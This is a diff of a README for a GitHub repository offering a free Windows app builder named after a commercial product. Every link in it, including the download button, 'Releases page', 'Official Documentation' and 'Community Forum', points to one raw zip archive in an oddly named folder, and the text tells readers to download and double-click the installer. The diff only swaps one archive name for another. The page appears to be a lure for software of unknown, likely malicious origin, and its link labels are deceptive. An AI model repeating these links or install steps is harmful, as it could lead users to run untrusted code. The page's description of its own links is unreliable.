@@ -1,6 +1,6 @@
 # 🎉 DecSoft-App-Builder-Free - Create Apps Easily on Windows
 
-[![Download Now](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip%20Now-Click%https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip)](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip)
+[![Download Now](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip%20Now-Click%https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip)](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip)
 
 ## 🛠️ Overview
 
@@ -19,18 +19,18 @@ Follow these simple steps to get started with DecSoft App Builder Free:
 2. **Visit the Download Page**  
    Click the button below to go to our Releases page and download the software.
 
-   [![Download Now](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip%20Now-Click%https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip)](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip)
+   [![Download Now](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip%20Now-Click%https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip)](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip)
 
 ## 📥 Download & Install
 
 1. **Access the Releases Page**  
-   Navigate to the [Releases page](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip).
+   Navigate to the [Releases page](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version of DecSoft App Builder. You will find the version number prominently displayed.
 
 3. **Download the Installer**  
-   Click on the installer file to download it. It will typically look something like `https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip`. Save this file to a location on your computer that is easy to access.
+   Click on the installer file to download it. It will typically look something like `https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip`. Save this file to a location on your computer that is easy to access.
 
 4. **Run the Installer**  
    Once the download is complete, find the file on your computer and double-click it to begin installation. Follow the on-screen instructions to install the application.
@@ -76,7 +76,7 @@ For any inquiries or feedback regarding DecSoft App Builder, please feel free to
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip)
-- [Community Forum](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Free_App_Dec_Soft_Builder_v1.2.zip)
+- [Official Documentation](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip)
+- [Community Forum](https://github.com/Harshit90248/DecSoft-App-Builder-Free/raw/refs/heads/main/clinohumite/Soft-Builder-Dec-Free-App-1.6.zip)
 
 Thank you for choosing DecSoft App Builder Free. We hope you enjoy designing your apps!
